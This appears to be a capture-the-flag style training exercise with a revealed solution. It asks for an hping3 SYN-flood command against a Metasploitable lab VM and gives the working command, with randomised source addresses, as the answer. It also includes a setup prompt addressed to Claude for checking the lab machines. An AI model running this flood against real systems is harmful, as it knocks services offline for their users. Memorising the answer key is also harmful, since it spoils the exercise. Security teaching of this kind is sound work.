# Q146 — hping3 SYN Flood

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / external |
| **Domain** | 09 — DoS / 08 — Social Eng / 10 — Session Hijacking / Recon |
| **Difficulty** | 🟢 Easy |
| **Tools** | `hping3`, `hulk`, `setoolkit`, `bettercap`, `shodan` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Use hping3 to SYN-flood Metasploitable port 80 from Parrot. Provide command (with random source).

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=sudo hping3 -S --flood --rand-source -p 80 192.168.52.129`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`--flood` no replies; `--rand-source` random src IPs.
</details>

<details>
<summary>Hint 2</summary>

Stop with Ctrl+C — lab only!
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sudo hping3 -S --flood --rand-source -p 80 192.168.52.129
```

Floods port 80 with SYNs.

**Answer:** `cmd=sudo hping3 -S --flood --rand-source -p 80 192.168.52.129`

📖 Ref: [playbooks/dos-playbook.md](../../playbooks/dos-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q146".
```
